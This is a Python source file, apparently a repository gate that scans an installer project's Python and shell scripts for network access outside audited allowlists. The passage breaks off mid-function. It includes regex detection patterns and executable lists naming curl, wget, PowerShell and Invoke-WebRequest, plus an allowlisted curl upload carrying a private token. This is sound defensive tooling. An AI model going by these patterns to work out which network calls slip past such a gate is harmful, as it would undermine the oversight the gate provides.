from __future__ import annotations

import ast
import email.utils
import errno
import hashlib
import http.client
import json
import os
import re
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.request
from collections.abc import Iterable
from contextlib import ExitStack
from dataclasses import dataclass
from email.message import Message
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "maintenance/tools"))

import downloader  # noqa: E402


DOWNLOADER_PATH = ROOT / "x86qw_runtime/io/downloader.py"
MANAGER_PATH = ROOT / "dist/installer/bin/manager.py"
SUPERVISOR_READINESS_PATH = ROOT / "x86qw_runtime/supervisor/readiness.py"
SUPERVISOR_CORE_PATH = ROOT / "x86qw_runtime/supervisor/core.py"
POSIX_GUARDIAN_PATH = ROOT / "x86qw_runtime/supervisor/posix_guardian.py"
MACOS_PLATFORM_PATH = ROOT / "x86qw_runtime/platform/macos.py"
PYTHON_RUNTIME_PATH = ROOT / "x86qw_runtime/platform/python_runtime.py"
POWERSHELL_BOOTSTRAP_PATHS = frozenset({
    ROOT / "dist/installer/bin/install.ps1",
    ROOT / "site/public/install.ps1",
})
PROTECTED_NETWORK_MODULES = (
    "http.client",
    "requests",
    "socket",
    "ssl",
    "urllib.request",
    "urllib3",
)
NETWORK_EXECUTABLES = frozenset({
    "curl", "curl.exe", "gh", "gh.exe", "git", "git.exe",
    "powershell", "powershell.exe", "pwsh", "wget", "wget.exe",
})
ALLOWED_NETWORK_MODULES = {
    DOWNLOADER_PATH: frozenset({"http.client", "socket", "ssl", "urllib.request"}),
    SUPERVISOR_READINESS_PATH: frozenset({"socket"}),
    **{
        path: frozenset({"http.client", "socket", "ssl", "urllib.request"})
        for path in POWERSHELL_BOOTSTRAP_PATHS
    },
}
POWERSHELL_NETWORK_MODULE_USAGES = {
    ("http.client", "ResilientHTTPSConnection", "http.client.HTTPSConnection"): 1,
    ("http.client", "transport_error", "http.client.IncompleteRead"): 1,
    ("http.client", "transport_error", "http.client.RemoteDisconnected"): 1,
    ("socket", "ConnectionRegistry.cancel", "socket.SHUT_RDWR"): 1,
    ("socket", "ResilientHTTPSConnection.__init__.create_connection", "socket._GLOBAL_DEFAULT_TIMEOUT"): 1,
    ("socket", "TransportController.cancel", "socket.SHUT_RDWR"): 1,
    ("socket", "create_resilient_connection", "socket.SOL_SOCKET"): 1,
    ("socket", "create_resilient_connection", "socket.SO_ERROR"): 1,
    ("socket", "create_resilient_connection", "socket._GLOBAL_DEFAULT_TIMEOUT"): 2,
    ("socket", "create_resilient_connection", "socket.getdefaulttimeout"): 1,
    ("socket", "create_resilient_connection", "socket.socket"): 1,
    ("socket", "resolve_addresses", "socket.AF_INET"): 2,
    ("socket", "resolve_addresses", "socket.AF_INET6"): 2,
    ("socket", "resolve_addresses", "socket.EAI_FAIL"): 1,
    ("socket", "resolve_addresses", "socket.SOCK_STREAM"): 1,
    ("socket", "resolve_addresses", "socket.gaierror"): 1,
    ("socket", "transient_os_error", "socket.EAI_AGAIN"): 1,
    ("socket", "transient_os_error", "socket.gaierror"): 1,
    ("socket", "transient_os_error", "socket.timeout"): 1,
    ("ssl", "transient_os_error", "ssl.SSLError"): 1,
    ("urllib.request", "DeadlineHttpsHandler", "urllib.request.HTTPSHandler"): 1,
    ("urllib.request", "HttpsOnlyRedirectHandler", "urllib.request.HTTPRedirectHandler"): 1,
    ("urllib.request", "download_attempt", "urllib.request.Request"): 1,
    ("urllib.request", "download_mirrors", "urllib.request.build_opener"): 1,
}
ALLOWED_NETWORK_MODULE_USAGES = {
    DOWNLOADER_PATH: {
        ("http.client", "ResilientHTTPSConnection", "http.client.HTTPSConnection"): 1,
        ("http.client", "_ConnectionRegistry.__init__", "http.client.HTTPSConnection"): 1,
        ("http.client", "_ConnectionRegistry.register", "http.client.HTTPSConnection"): 1,
        ("http.client", "_DeadlineHTTPSHandler.__init__", "http.client.HTTPSConnection"): 1,
        ("http.client", "_build_https_opener", "http.client.HTTPSConnection"): 1,
        ("http.client", "_transport_error", "http.client.IncompleteRead"): 1,
        ("http.client", "_transport_error", "http.client.RemoteDisconnected"): 1,
        ("socket", "ResilientHTTPSConnection.__init__.create_connection", "socket._GLOBAL_DEFAULT_TIMEOUT"): 1,
        ("socket", "ResilientHTTPSConnection.__init__.create_connection", "socket.socket"): 1,
        ("socket", "_ConnectionRegistry.cancel", "socket.SHUT_RDWR"): 1,
        ("socket", "_TransportController.__init__", "socket.socket"): 1,
        ("socket", "_TransportController.attach_socket", "socket.socket"): 1,
        ("socket", "_TransportController.cancel", "socket.SHUT_RDWR"): 1,
        ("socket", "_TransportController.detach_socket", "socket.socket"): 1,
        ("socket", "_resolve_addresses", "socket.AF_INET"): 2,
        ("socket", "_resolve_addresses", "socket.AF_INET6"): 2,
        ("socket", "_resolve_addresses", "socket.EAI_FAIL"): 1,
        ("socket", "_resolve_addresses", "socket.SOCK_STREAM"): 1,
        ("socket", "_resolve_addresses", "socket.gaierror"): 1,
        ("socket", "_transient_os_error", "socket.EAI_AGAIN"): 1,
        ("socket", "_transient_os_error", "socket.gaierror"): 1,
        ("socket", "_transient_os_error", "socket.timeout"): 1,
        ("socket", "create_resilient_connection", "socket.SOL_SOCKET"): 1,
        ("socket", "create_resilient_connection", "socket.SO_ERROR"): 1,
        ("socket", "create_resilient_connection", "socket._GLOBAL_DEFAULT_TIMEOUT"): 2,
        ("socket", "create_resilient_connection", "socket.getdefaulttimeout"): 1,
        ("socket", "create_resilient_connection", "socket.socket"): 4,
        ("ssl", "_transient_os_error", "ssl.SSLError"): 1,
        ("urllib.request", "<module>", "urllib.request.Request"): 1,
        ("urllib.request", "HTTPSOnlyRedirectHandler", "urllib.request.HTTPRedirectHandler"): 1,
        ("urllib.request", "_DeadlineHTTPSHandler", "urllib.request.HTTPSHandler"): 1,
        ("urllib.request", "_DeadlineHTTPSHandler.https_open", "urllib.request.Request"): 1,
        ("urllib.request", "_attempt", "urllib.request.Request"): 1,
        ("urllib.request", "_build_https_opener", "urllib.request.OpenerDirector"): 1,
        ("urllib.request", "_build_https_opener", "urllib.request.build_opener"): 1,
        ("urllib.request", "_open_with_deadline", "urllib.request.Request"): 1,
        ("urllib.request", "_select_transport.selected_open", "urllib.request.Request"): 1,
    },
    SUPERVISOR_READINESS_PATH: {
        ("socket", "apply_startup_rcon", "socket.AF_INET"): 1,
        ("socket", "apply_startup_rcon", "socket.AF_INET6"): 1,
        ("socket", "apply_startup_rcon", "socket.SOCK_DGRAM"): 1,
        ("socket", "apply_startup_rcon", "socket.socket"): 1,
        ("socket", "preflight_ports", "socket"): 1,
        ("socket", "preflight_ports", "socket.AF_INET"): 1,
        ("socket", "preflight_ports", "socket.AF_INET6"): 1,
        ("socket", "preflight_ports", "socket.SOCK_DGRAM"): 1,
        ("socket", "preflight_ports", "socket.SOCK_STREAM"): 1,
        ("socket", "preflight_ports", "socket.SOL_SOCKET"): 1,
        ("socket", "preflight_ports", "socket.SO_EXCLUSIVEADDRUSE"): 1,
        ("socket", "preflight_ports", "socket.socket"): 1,
        ("socket", "wait_http_readiness", "socket.create_connection"): 1,
        ("socket", "wait_udp_readiness", "socket"): 1,
        ("socket", "wait_udp_readiness", "socket.AF_INET"): 1,
        ("socket", "wait_udp_readiness", "socket.AF_INET6"): 1,
        ("socket", "wait_udp_readiness", "socket.SOCK_DGRAM"): 1,
        ("socket", "wait_udp_readiness", "socket.SOL_SOCKET"): 1,
        ("socket", "wait_udp_readiness", "socket.SO_EXCLUSIVEADDRUSE"): 1,
        ("socket", "wait_udp_readiness", "socket.socket"): 1,
    },
    **{
        path: dict(POWERSHELL_NETWORK_MODULE_USAGES)
        for path in POWERSHELL_BOOTSTRAP_PATHS
    },
}
ALLOWED_NETWORK_EXECUTABLE_SCOPES = {
    DOWNLOADER_PATH: {
        "socket": frozenset({"_resolve_addresses"}),
    },
    ROOT / "maintenance/manage.py": {
        "gh": frozenset({"github_api_headers", "publish_github"}),
        "git": frozenset({"command_commit", "require_clean_worktree"}),
    },
    ROOT / "maintenance/tools/check_committed_diff.py": {
        "git": frozenset({"committed_diff_command"}),
    },
    ROOT / "maintenance/tools/check_lfs.py": {
        "git": frozenset({"git", "lfs_attributes", "tracked_files"}),
    },
    ROOT / "maintenance/tools/publish_gitlab_packages.py": {
        "curl": frozenset({"upload"}),
    },
    **{
        path: {"socket": frozenset({"resolve_addresses"})}
        for path in POWERSHELL_BOOTSTRAP_PATHS
    },
}
# Exact suppressions for audited dispatchers. A new path, scope, API or argv
# expression remains a gate failure instead of inheriting a file-wide exception.
ALLOWED_DYNAMIC_PROCESS_CALLS = {
    ROOT / "maintenance/manage.py": frozenset({
        ("subprocess.run", "run", "command"),
    }),
    PYTHON_RUNTIME_PATH: frozenset({
        ("subprocess.run", "run_handoff", "command"),
    }),
    SUPERVISOR_CORE_PATH: frozenset({
        ("subprocess.Popen", "WindowsJobObject.start_process", "arguments"),
    }),
    POSIX_GUARDIAN_PATH: frozenset({
        ("subprocess.Popen", "_child_main", "tuple(launch['arguments'])"),
    }),
    MACOS_PLATFORM_PATH: frozenset({
        ("subprocess.run", "_run_codesign", "arguments"),
    }),
    ROOT / "maintenance/tools/check_committed_diff.py": frozenset({
        ("subprocess.run", "main", "command"),
    }),
}
# Audited argv-forwarding helpers. Their subprocess call is suppressed above,
# but every caller remains part of the gate and is checked with the effective
# argv produced by the wrapper.
PROCESS_WRAPPER_MODELS = {
    ROOT / "maintenance/manage.py": {
        "run": ("argv", ()),
    },
    ROOT / "maintenance/tools/check_lfs.py": {
        "git": ("varargs", ("git",)),
    },
}
FORBIDDEN_DOWNLOADER_TRANSPORT_EXPORTS = frozenset({
    "DNS_RESOLVER_SCRIPT", "HTTPSOnlyRedirectHandler", "ResilientHTTPSConnection",
    "_ConnectionRegistry", "_DeadlineHTTPSHandler", "_TransportController",
    "_attempt", "_build_https_opener", "_download_impl", "_download_mirrors_impl",
    "_open_with_deadline", "_resolve_addresses", "_select_transport",
    "create_resilient_connection",
})
FORBIDDEN_HIGH_LEVEL_NETWORK_APIS = frozenset({
    "urllib.request.FancyURLopener", "urllib.request.URLopener",
    "urllib.request.install_opener", "urllib.request.urlcleanup",
    "urllib.request.urlretrieve", "urllib.request.urlopen",
})
ALLOWED_NETWORK_PROCESS_CALLS = {
    ROOT / "maintenance/manage.py": frozenset({
        ("gh", "subprocess.run", "github_api_headers", "subprocess.run(['gh', 'auth', 'token'], cwd=PROJECT_ROOT, text=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=10, check=False)"),
        ("gh", "run", "publish_github", 'run([\'gh\', \'api\', \'--method\', \'PATCH\', f"repos/{repository}/releases/{release[\'id\']}", \'-f\', f\'name={title}\', \'-f\', f\'body={release_notes}\', \'-f\', f"make_latest={(\'true\' if make_latest else \'false\')}"])'),
        ("gh", "run", "publish_github", "run(['gh', 'release', 'create', tag, '--repo', repository, '--title', title, '--notes', release_notes, '--latest' if make_latest else '--latest=false'])"),
        ("gh", "run", "publish_github", "run(['gh', 'release', 'upload', tag, str(path), '--repo', repository])"),
        ("git", "run", "command_commit", "run(['git', 'add', 'dist', 'maintenance/inventory', 'maintenance/recipes', 'site/public/api/v1/catalog.json'])"),
        ("git", "run", "command_commit", "run(['git', 'commit', '-m', message])"),
        ("git", "run", "command_commit", "run(['git', 'diff', '--cached', '--name-only'], capture=True)"),
        ("git", "run", "command_commit", "run(['git', 'push', 'gitlab', 'HEAD'])"),
        ("git", "run", "command_commit", "run(['git', 'push', 'origin', 'HEAD'])"),
        ("git", "run", "command_commit", "run(['git', 'remote'], capture=True)"),
        ("git", "run", "command_commit", "run(['git', 'status', '--porcelain'], capture=True)"),
        ("git", "run", "require_clean_worktree", "run(['git', 'status', '--porcelain'], capture=True)"),
    }),
    ROOT / "maintenance/tools/check_lfs.py": frozenset({
        ("git", "git", "lfs_attributes", "git('check-attr', '-z', '--stdin', 'filter', stdin=payload)"),
        ("git", "git", "tracked_files", "git('ls-files', '-z')"),
        ("git", "subprocess.run", "git", "subprocess.run(['git', *arguments], cwd=ROOT, input=stdin, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)"),
    }),
    ROOT / "maintenance/tools/publish_gitlab_packages.py": frozenset({
        ("curl", "subprocess.run", "upload", "subprocess.run(['curl', '--disable', '--fail', '--silent', '--show-error', '--proto', '=https', '--proto-redir', '=https', '--connect-timeout', '15', '--max-time', '900', '--max-redirs', '0', '--output', os.devnull, '--write-out', '%{http_code}', '--request', 'PUT', '--header', '@-', '--upload-file', str(path), artifact_url(package)], input=f'PRIVATE-TOKEN: {token}\\n', text=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, check=False)"),
    }),
}
ALLOWED_OPENER_OPEN_CALLS = {
    DOWNLOADER_PATH: {
        ("HTTPSOnlyRedirectHandler.http_error_302", "self.parent.open(redirected, timeout=request.timeout)"): 1,
        ("_select_transport.selected_open", "selected_opener.open(request, timeout=timeout)"): 1,
    },
    **{
        path: {
            ("HttpsOnlyRedirectHandler.http_error_302", "self.parent.open(redirected, timeout=req.timeout)"): 1,
            ("open_with_deadline.worker", "opener.open(request, timeout=socket_timeout)"): 1,
        }
        for path in POWERSHELL_BOOTSTRAP_PATHS
    },
}
ALLOWED_EMBEDDED_NETWORK_COMMANDS = {
    DOWNLOADER_PATH: {
        "DNS_RESOLVER_SCRIPT": frozenset({"socket"}),
    },
    MANAGER_PATH: {
        "PUBLIC_UNIX_BOOTSTRAP_COMMAND": frozenset({"curl"}),
        "PUBLIC_POWERSHELL_BOOTSTRAP_COMMAND": frozenset({"powershell-http"}),
    },
    **{
        path: {"DNS_RESOLVER_SCRIPT": frozenset({"socket"})}
        for path in POWERSHELL_BOOTSTRAP_PATHS
    },
}
UNIX_BOOTSTRAP_ALLOWANCES = {
    "curl": (
        r"^\s*command -v curl >/dev/null 2>&1 \|\| fail \"curl não foi encontrado\.\"\s*$",
        r"^\s*if curl --disable --fail --location \\\s*$",
    ),
}
POWERSHELL_BOOTSTRAP_ALLOWANCES = {
    "http.client": (r"^\s*import http\.client\s*$",),
    "powershell": (
        r'^\s*"Depois abra um novo PowerShell e execute o instalador novamente\.",\s*$',
    ),
    "socket": (r"^\s*import socket\s*$", r"^\s*import socket\s*$"),
    "ssl": (r"^\s*import ssl\s*$",),
    "urllib.request": (r"^\s*import urllib\.request\s*$",),
}
ALLOWED_BOOTSTRAP_SCRIPT_LINES = {
    ROOT / "dist/installer/bin/install.sh": UNIX_BOOTSTRAP_ALLOWANCES,
    ROOT / "site/public/install.sh": UNIX_BOOTSTRAP_ALLOWANCES,
    ROOT / "dist/installer/bin/install.ps1": POWERSHELL_BOOTSTRAP_ALLOWANCES,
    ROOT / "site/public/install.ps1": POWERSHELL_BOOTSTRAP_ALLOWANCES,
}


@dataclass(frozen=True)
class RemoteBoundaryViolation:
    path: Path
    line: int
    mechanism: str

    def render(self) -> str:
        try:
            location = self.path.relative_to(ROOT)
        except ValueError:
            location = self.path
        return f"{location}:{self.line}: {self.mechanism}"


def is_python_consumer(path: Path) -> bool:
    if path.suffix.casefold() in {".py", ".pyw"}:
        return True
    if path.suffix:
        return False
    try:
        with path.open("rb") as stream:
            shebang = stream.readline(256)
    except OSError:
        return False
    return shebang.startswith(b"#!") and b"python" in shebang.lower()


def is_shell_consumer(path: Path) -> bool:
    try:
        with path.open("rb") as stream:
            shebang = stream.readline(256).lower()
    except OSError:
        return False
    return bool(re.match(
        rb"^#![^\r\n]*(?:/|\s)(?:(?:a|ba|c|da|fi|k|tc|z)?sh|powershell|pwsh)(?:\s|$)",
        shebang,
    ))


def remote_consumer_files(roots: Iterable[Path]) -> list[Path]:
    paths: set[Path] = set()
    supported = {
        ".ash", ".bash", ".bat", ".cmd", ".command", ".csh", ".dash",
        ".fish", ".ksh", ".ps1", ".psm1", ".py", ".pyw", ".sh",
        ".tcsh", ".zsh",
    }

    def supported_consumer(path: Path) -> bool:
        return (
            path.suffix.casefold() in supported
            or is_python_consumer(path)
            or is_shell_consumer(path)
        )

    for root in roots:
        if root.is_file():
            if supported_consumer(root):
                paths.add(root)
            continue
        for path in root.rglob("*"):
            if (
                path.is_file()
                and supported_consumer(path)
                and "__pycache__" not in path.parts
            ):
                paths.add(path)
    return sorted(paths, key=os.fspath)


def dotted_name(node: ast.AST) -> str | None:
    parts: list[str] = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if not isinstance(node, ast.Name):
        return None
    parts.append(node.id)
    return ".".join(reversed(parts))


def protected_module(name: str) -> str | None:
    return next(
        (
            module for module in PROTECTED_NETWORK_MODULES
            if name == module or name.startswith(module + ".")
        ),
        None,
    )


def remote_string_mechanisms(value: str) -> set[str]:
    mechanisms: set[str] = set()
    folded = value.casefold()
    command_patterns = {
        "curl": r"(?<![\w.-])curl(?:\.exe)?(?![\w.-])",
        "wget": r"(?<![\w.-])wget(?:\.exe)?(?![\w.-])",
        "powershell": r"(?<![\w.-])(?:powershell(?:\.exe)?|pwsh)(?![\w.-])",
        "powershell-http": (
            r"invoke-(?:webrequest|restmethod)|(?<![\w-])(?:irm|iwr)(?![\w-])|"
            r"start-bitstransfer|(?:system\.)?net\."
            r"(?:http|httpwebrequest|webclient|webrequest)"
        ),
    }
    for mechanism, pattern in command_patterns.items():
        if re.search(pattern, folded):
            mechanisms.add(mechanism)
    module_patterns = {
        "http.client": r"\b(?:import\s+http\.client|from\s+http\s+import\s+client)\b",
        "requests": r"\b(?:import\s+requests\b|from\s+requests(?:\.|\s+import))",
        "urllib.request": (
            r"\b(?:import\s+urllib\.request|from\s+urllib\s+import\s+request|"
            r"from\s+urllib\.request\s+import)\b"
        ),
        "urllib3": r"\b(?:import\s+urllib3\b|from\s+urllib3(?:\.|\s+import))",
    }
    for module, pattern in module_patterns.items():
        if re.search(pattern, folded):
            mechanisms.add(module)
    for module in ("socket", "ssl"):
        if re.search(rf"\b(?:from\s+{module}\b|import\s+[^\n#]*\b{module}\b)", folded):
            mechanisms.add(module)
    return mechanisms


def remote_process_mechanisms(value: str) -> set[str]:
    mechanisms = remote_string_mechanisms(value)
    folded = value.casefold()
    for executable in ("gh", "git"):
        if re.search(rf"(?<![\w.-]){executable}(?:\.exe)?(?![\w.-])", folded):
            mechanisms.add(executable)
    return mechanisms


def assigned_names(node: ast.Assign | ast.AnnAssign | ast.NamedExpr) -> set[str]:
    targets: list[ast.AST]
    if isinstance(node, ast.Assign):
        targets = list(node.targets)
    else:
        targets = [node.target]
    return {target.id for target in targets if isinstance(target, ast.Name)}


def lexical_scope_path(node: ast.AST, parents: dict[ast.AST, ast.AST]) -> str:
    scopes: list[str] = []
    current = parents.get(node)
    while current is not None:
        if isinstance(current, (ast.AsyncFunctionDef, ast.ClassDef, ast.FunctionDef)):
            scopes.append(current.name)
        current = parents.get(current)
    return ".".join(reversed(scopes)) or "<module>"


def scan_python_remote_boundary(
    path: Path,
    source: str | None = None,
) -> list[RemoteBoundaryViolation]:
    if source is None:
        source = path.read_text(encoding="utf-8")
    tree = ast.parse(source, filename=os.fspath(path))
    parents = {
        child: parent for parent in ast.walk(tree) for child in ast.iter_child_nodes(parent)
    }
    aliases: dict[str, str] = {}
    violations: set[RemoteBoundaryViolation] = set()
    network_process_seen: dict[tuple[str, str, str, str], list[ast.Call]] = {}
    network_module_seen: dict[tuple[str, str, str], list[ast.AST]] = {}
    opener_open_seen: dict[tuple[str, str], list[ast.Call]] = {}
    allowed_modules = ALLOWED_NETWORK_MODULES.get(path, frozenset())
    scope_types = (ast.AsyncFunctionDef, ast.ClassDef, ast.FunctionDef, ast.Lambda)
    process_calls = {
        "os.system", "subprocess.Popen", "subprocess.call",
        "subprocess.check_call", "subprocess.check_output", "subprocess.run",
    }
    shell_executables = frozenset({
        "ash", "bash", "cmd", "cmd.exe", "dash", "fish", "ksh", "powershell",
        "powershell.exe", "pwsh", "python", "python.exe", "python3", "sh", "zsh",
    })
    assignment_index: dict[tuple[ast.AST, str], list[ast.AST]] = {}
    helper_index: dict[tuple[ast.AST, str], list[ast.FunctionDef | ast.AsyncFunctionDef]] = {}
    local_bindings: dict[ast.AST, set[str]] = {tree: set()}
    parameters: dict[ast.AST, set[str]] = {}

    def position(node: ast.AST) -> tuple[int, int]:
        return (getattr(node, "lineno", -1), getattr(node, "col_offset", -1))

    def containing_scope(node: ast.AST) -> ast.AST:
        current = parents.get(node)
        while current is not None:
            if isinstance(current, scope_types):
                return current
            current = parents.get(current)
        return tree

    def scope_chain(node: ast.AST) -> list[ast.AST]:
        result: list[ast.AST] = []
        current: ast.AST | None = containing_scope(node)
        while current is not None:
            result.append(current)
            if current is tree:
                break
            parent = parents.get(current)
            while parent is not None and not isinstance(parent, scope_types):
                parent = parents.get(parent)
            current = parent if parent is not None else tree
        if tree not in result:
            result.append(tree)
        return result

    def function_parameters(node: ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda) -> set[str]:
        arguments = node.args
        names = {
            argument.arg
            for argument in (*arguments.posonlyargs, *arguments.args, *arguments.kwonlyargs)
        }
        if arguments.vararg is not None:
            names.add(arguments.vararg.arg)
        if arguments.kwarg is not None:
            names.add(arguments.kwarg.arg)
        return names

    for candidate in ast.walk(tree):
        if isinstance(candidate, scope_types):
            local_bindings.setdefault(candidate, set())
        if isinstance(candidate, (ast.FunctionDef, ast.AsyncFunctionDef)):
            parent_scope = containing_scope(candidate)
            local_bindings.setdefault(parent_scope, set()).add(candidate.name)
            helper_index.setdefault((parent_scope, candidate.name), []).append(candidate)
            parameters[candidate] = function_parameters(candidate)
            local_bindings[candidate].update(parameters[candidate])
        elif isinstance(candidate, ast.Lambda):
            parameters[candidate] = function_parameters(candidate)
            local_bindings[candidate].update(parameters[candidate])
        elif isinstance(candidate, (ast.Assign, ast.AnnAssign, ast.NamedExpr)):
            scope = containing_scope(candidate)
            for name in assigned_names(candidate):
                local_bindings.setdefault(scope, set()).add(name)
                assignment_index.setdefault((scope, name), []).append(candidate)

    for assignments in assignment_index.values():
        assignments.sort(key=position)
    for helpers in helper_index.values():
        helpers.sort(key=position)

    def prior_assignments(name: str, use_node: ast.AST) -> tuple[ast.AST, list[ast.AST]] | None:
        use_position = position(use_node)
        for scope in scope_chain(use_node):
            if name not in local_bindings.get(scope, set()):
                continue
            if name in parameters.get(scope, set()):
                return (scope, [])
            candidates = [
                assignment
                for assignment in assignment_index.get((scope, name), [])
                if position(assignment) < use_position
            ]
            return (scope, candidates)
        return None

    def helper_definition(
        name: str,
        use_node: ast.AST,
    ) -> ast.FunctionDef | ast.AsyncFunctionDef | None:
        use_position = position(use_node)
        for scope in scope_chain(use_node):
            if name not in local_bindings.get(scope, set()):
                continue
            if name in parameters.get(scope, set()):
                return None
            assignments = [
                assignment
                for assignment in assignment_index.get((scope, name), [])
                if position(assignment) < use_position
            ]
            helpers = [
                helper
                for helper in helper_index.get((scope, name), [])
                if position(helper) < use_position
            ]
            if assignments or len(helpers) != 1:
                return None
            return helpers[0]
        return None

    Binding = tuple[ast.AST, ast.AST]

    def resolve_string(
        node: ast.AST,
        use_node: ast.AST,
        bindings: dict[str, Binding] | None = None,
        seen: frozenset[tuple[int, str]] = frozenset(),
    ) -> str | None:
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if (
            isinstance(node, ast.Attribute)
            and dotted_name(node) == "sys.executable"
        ):
            return os.fspath(sys.executable)
        if isinstance(node, ast.Name):
            if bindings is not None and node.id in bindings:
                argument, caller = bindings[node.id]
                return resolve_string(argument, caller, None, seen)
            lookup = prior_assignments(node.id, use_node)
            if lookup is None:
                return None
            scope, assignments = lookup
            marker = (id(scope), node.id)
            if marker in seen or not assignments:
                return None
            values = {
                resolve_string(assignment.value, assignment, bindings, seen | {marker})
                for assignment in assignments
            }
            return next(iter(values)) if len(values) == 1 and None not in values else None
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = resolve_string(node.left, use_node, bindings, seen)
            right = resolve_string(node.right, use_node, bindings, seen)
            return None if left is None or right is None else left + right
        if isinstance(node, ast.JoinedStr):
            parts: list[str] = []
            for value in node.values:
                if not isinstance(value, ast.Constant) or not isinstance(value.value, str):
                    return None
                parts.append(value.value)
            return "".join(parts)
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "join"
            and len(node.args) == 1
            and not node.keywords
            and isinstance(node.args[0], (ast.List, ast.Tuple))
        ):
            separator = resolve_string(node.func.value, use_node, bindings, seen)
            parts = [
                resolve_string(item, use_node, bindings, seen)
                for item in node.args[0].elts
            ]
            if separator is not None and all(part is not None for part in parts):
                return separator.join(part for part in parts if part is not None)
        if (
            isinstance(node, ast.Call)
            and dotted_name(node.func) in {"os.fspath", "str"}
            and len(node.args) == 1
            and not node.keywords
        ):
            return resolve_string(node.args[0], use_node, bindings, seen)
        try:
            value = ast.literal_eval(node)
        except (ValueError, TypeError):
            return None
        return value if isinstance(value, str) else None

    def resolve_helper_call(
        call: ast.Call,
        use_node: ast.AST,
        outer_bindings: dict[str, Binding] | None,
        seen: frozenset[tuple[int, str]],
    ) -> tuple[
        ast.AST,
        dict[str, Binding],
        ast.FunctionDef | ast.AsyncFunctionDef,
    ] | None:
        helper_name = dotted_name(call.func)
        if helper_name is None or "." in helper_name or call.keywords:
            return None
        helper = helper_definition(helper_name, use_node)
        if helper is None or helper.args.vararg or helper.args.kwarg or helper.args.kwonlyargs:
            return None
        parameters_in_order = tuple(
            argument.arg for argument in (*helper.args.posonlyargs, *helper.args.args)
        )
        if len(call.args) != len(parameters_in_order):
            return None
        returns = [statement for statement in helper.body if isinstance(statement, ast.Return)]
        if len(returns) != 1 or returns[0].value is None:
            return None
        bindings = dict(outer_bindings or {})
        for parameter, argument in zip(parameters_in_order, call.args):
            bindings[parameter] = (argument, use_node)
        marker = (id(containing_scope(helper)), helper.name)
        if marker in seen:
            return None
        return returns[0].value, bindings, helper

    def resolve_argv(
        node: ast.AST,
        use_node: ast.AST,
        bindings: dict[str, Binding] | None = None,
        seen: frozenset[tuple[int, str]] = frozenset(),
    ) -> list[str | None] | None:
        if isinstance(node, ast.Name):
            if bindings is not None and node.id in bindings:
                argument, caller = bindings[node.id]
                return resolve_argv(argument, caller, None, seen)
            lookup = prior_assignments(node.id, use_node)
            if lookup is None:
                return None
            scope, assignments = lookup
            marker = (id(scope), node.id)
            if marker in seen or not assignments:
                return None
            values = [
                resolve_argv(assignment.value, assignment, bindings, seen | {marker})
                for assignment in assignments
            ]
            if any(value is None for value in values):
                return None
            normalized = {tuple(value or []) for value in values}
            return list(next(iter(normalized))) if len(normalized) == 1 else None
        if isinstance(node, (ast.List, ast.Tuple, ast.Set)):
            result: list[str | None] = []
            for item in node.elts:
                if isinstance(item, ast.Starred):
                    expanded = resolve_argv(item.value, use_node, bindings, seen)
                    result.extend(expanded if expanded is not None else [None])
                else:
                    result.append(resolve_string(item, use_node, bindings, seen))
            return result
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = resolve_argv(node.left, use_node, bindings, seen)
            right = resolve_argv(node.right, use_node, bindings, seen)
            return None if left is None or right is None else left + right
        if isinstance(node, ast.Call):
            helper = resolve_helper_call(node, use_node, bindings, seen)
            if helper is not None:
                returned, helper_bindings, helper_definition_node = helper
                marker = (
                    id(containing_scope(helper_definition_node)),
                    helper_definition_node.name,
                )
                return resolve_argv(returned, returned, helper_bindings, seen | {marker})
        scalar = resolve_string(node, use_node, bindings, seen)
        return [scalar] if scalar is not None else None

    def known_strings(
        node: ast.AST,
        use_node: ast.AST,
    ) -> list[str]:
        scalar = resolve_string(node, use_node)
        if scalar is not None:
            return [scalar]
        if isinstance(node, (ast.List, ast.Tuple, ast.Set)):
            result: list[str] = []
            for item in node.elts:
                if isinstance(item, ast.Starred):
                    continue
                result.extend(known_strings(item, use_node))
            return result
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            return known_strings(node.left, use_node) + known_strings(node.right, use_node)
        return []

    def report(node: ast.AST, mechanism: str) -> None:
        violations.add(RemoteBoundaryViolation(path, getattr(node, "lineno", 1), mechanism))

    def module_is_allowed(module: str) -> bool:
        return module in allowed_modules

    def usage_is_allowed(node: ast.AST, module: str, expression: str) -> bool:
        key = (module, lexical_scope_path(node, parents), expression)
        network_module_seen.setdefault(key, []).append(node)
        return key in ALLOWED_NETWORK_MODULE_USAGES.get(path, {})

    def executable_is_allowed(node: ast.AST, executable: str) -> bool:
        allowed_scopes = ALLOWED_NETWORK_EXECUTABLE_SCOPES.get(path, {}).get(
            executable, frozenset()
        )
        return lexical_scope_path(node, parents) in allowed_scopes

    def dynamic_process_is_allowed(
        node: ast.AST,
        call_name: str,
        first_argument: ast.AST,
    ) -> bool:
        expression = ast.unparse(first_argument)
        allowed = ALLOWED_DYNAMIC_PROCESS_CALLS.get(path, frozenset())
        return (call_name, lexical_scope_path(node, parents), expression) in allowed

    def resolved_dotted_name(node: ast.AST) -> str | None:
        name = dotted_name(node)
        if name is None:
            return None
        prefix, separator, suffix = name.partition(".")
        if prefix in aliases:
            return aliases[prefix] + (separator + suffix if separator else "")
        return name

    def reflective_boundary(call: ast.Call) -> str | None:
        if dotted_name(call.func) != "getattr" or len(call.args) < 2:
            return None
        target = resolved_dotted_name(call.args[0])
        if target is None:
            return None
        attribute = resolve_string(call.args[1], call)
        if path in ALLOWED_OPENER_OPEN_CALLS and attribute == "open":
            return "acesso reflexivo a opener.open"
        if target == "subprocess" or target.startswith("subprocess."):
            if attribute is None or attribute in {
                "Popen", "call", "check_call", "check_output", "run",
            }:
                return "acesso reflexivo a subprocesso"
            if re.fullmatch(r"[A-Z][A-Z0-9_]*", attribute) is None:
